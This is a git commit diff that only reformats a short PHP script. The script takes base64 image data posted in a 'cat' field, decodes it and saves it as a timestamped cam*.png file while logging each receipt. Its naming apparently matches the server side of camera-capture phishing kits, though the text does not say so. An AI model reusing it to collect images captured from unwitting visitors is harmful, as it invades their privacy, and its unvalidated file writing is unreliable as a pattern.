9690aa7da18276f95f260dd1c425b7a5d17529a8
vIPERexe2 <148722243+vIPERexe2@users.noreply.github.com>
2024-05-06 11:52:57 +0300

    Update post.php

--- post.php
+++ post.php
@@ -1,19 +1,19 @@
 <?php
 
 $date = date('dMYHis');
-$imageData=$_POST['cat'];
+$imageData = $_POST['cat'];
 
-if (!empty($_POST['cat'])) {
-error_log("Received" . "\r\n", 3, "Log.log");
-
+if (!empty($imageData)) {
+    error_log("Received" . "\r\n", 3, "Log.log");
 }
 
-$filteredData=substr($imageData, strpos($imageData, ",")+1);
-$unencodedData=base64_decode($filteredData);
-$fp = fopen( 'cam'.$date.'.png', 'wb' );
-fwrite( $fp, $unencodedData);
-fclose( $fp );
+$filteredData = substr($imageData, strpos($imageData, ",") + 1);
+$unencodedData = base64_decode($filteredData);
+
+$filename = 'cam' . $date . '.png';
+$fp = fopen($filename, 'wb');
+fwrite($fp, $unencodedData);
+fclose($fp);
 
 exit();
 ?>
-
